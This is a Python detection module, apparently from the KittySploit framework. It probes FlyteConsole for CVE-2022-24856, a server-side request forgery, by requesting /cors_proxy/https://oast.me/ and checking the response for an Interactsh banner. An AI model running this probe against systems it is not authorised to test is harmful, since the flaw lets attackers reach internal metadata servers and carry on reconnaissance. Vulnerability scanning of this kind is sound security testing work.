#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FlyteConsole is the web user interface for the Flyte platform."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Flyte Console <0.52.0 - Server-Side Request Forgery Detection',
        'description': 'FlyteConsole is the web user interface for the Flyte platform. FlyteConsole prior to version 0.52.0 is vulnerable to server-side request forgery when FlyteConsole is open to the general internet. An attacker can exploit any user of a vulnerable instance to access the internal metadata server or other unauthenticated URLs. Passing of headers to an unauthorized actor may occur.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'flyteconsole', 'ssrf', 'oss', 'hackerone', 'flyte', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/flyteorg/flyteconsole/security/advisories/GHSA-www6-hf2v-v9m9',
            'https://github.com/flyteorg/flyteconsole/pull/389',
            'https://hackerone.com/reports/1540906',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-24856',
            'https://github.com/flyteorg/flyteconsole/commit/05b88ed2d2ecdb5d8a8404efea25414e57189709',
        ],
        'cve': 'CVE-2022-24856',
    }

    def run(self):
        r = self.http_request(method="GET", path='/cors_proxy/https://oast.me/', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Interactsh Server',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="Flyte Console <0.52.0 - Server-Side Request Forgery detected",
                path='/cors_proxy/https://oast.me/',
            )
            return True
        return False

